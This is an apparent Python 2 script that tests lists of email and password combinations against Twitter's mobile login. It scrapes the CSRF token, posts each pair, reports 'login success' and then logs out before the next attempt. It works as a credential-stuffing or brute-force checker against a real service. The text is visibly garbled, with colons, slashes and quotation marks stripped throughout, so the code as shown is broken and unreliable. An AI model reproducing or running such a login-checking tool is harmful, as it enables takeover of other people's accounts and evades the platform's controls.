#!usrbinenv python
# encoding utf-8
# email ringzero@0x557.org

import json
import re
import requests
import time

import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

requests = requests.Session()

headers = {
    'User-Agent' 'Mozilla5.0 (MeeGo; NokiaN9) AppleWebKit534.13 (KHTML, like Gecko) NokiaBrowser8.5.0 Mobile Safari534.13',
    'accept-language' 'zh-CN,zh;q=0.8,en;q=0.6',
    'origin' 'httpsmobile.twitter.com',
    'pragma' 'no-cache',
    'referer' 'httpsmobile.twitter.comlogin',
    'upgrade-insecure-requests' '1',
}

class Twitter_Login(object)
    docstring for Twitter_Login
    def __init__(self)
        super(Twitter_Login, self).__init__()
        self.website = 'httpsmobile.twitter.com'
        
    def parser_token(self, content)
        auth_token = re.search('authenticity_token type=hidden value=(.)', content)
        return auth_token.group(1) if auth_token else None

    def init_token(self)
        url = '{0}login'.format(self.website)
        content = requests.get(url, headers=headers, allow_redirects=True).content
        return content

    def parser_success(self, email, content)
        if email in content or '记录不匹配' in content
            return False
        else
            return True

    def session(self, token, email, password)
        payload = {
            'authenticity_token'  token,
            'session[username_or_email]'  email,
            'session[password]' password,
            'remember_me'  1, 
            'wfa'  1,
            'commit' '登入',
        }

        url = '{0}sessions'.format(self.website)
        result = requests.post(url,
            headers=headers,
            data=payload,
            allow_redirects=True)
        return result

    def run(self)
        session_content = self.init_token()
        userdict = [
            'ring05h@gmail.com123456',
            'ring07h@gmail.com123456',
            'ring08h@gmail.com123456',
            'ring04h@gmail.comtruepassword',
            'ring09h@gmail.com123456',
            'ring10h@gmail.com123456',
            'ring11h@gmail.com123456',
            'ring12h@gmail.com123456',
            'ring13h@gmail.com123456',
            'ring14h@gmail.com123456',
            'ring15h@gmail.com123456',
            'ring16h@gmail.com123456',
            'ring17h@gmail.com123456',
            'ring18h@gmail.com123456',]

        for combo in userdict
            token = self.parser_token(session_content)
            if token is not None
                email, password = combo.split('')
                print 'Starting check {0}  {1}'.format(email, password)
                session_content = self.session(token, email, password).content
                if self.parser_success(email, session_content)
                    print email, password, 'login success.'
                    self.destroy()
                    time.sleep(2)
                    session_content = self.init_token()
                time.sleep(3)

    def destroy(self)
        print 'call destroy()'
        url = '{0}account'.format(self.website)
        content = requests.get(url, headers=headers, allow_redirects=True).content
        token = self.parser_token(content)

        if token is not None
            # destroy logout
            url = '{0}sessiondestroy'.format(self.website)
            payload = {
                'authenticity_token' token,
                'commit' '登出'
            }
            result = requests.post(url,
                headers=headers,
                data=payload,
                allow_redirects=True)
        
twitter = Twitter_Login()
twitter.run()
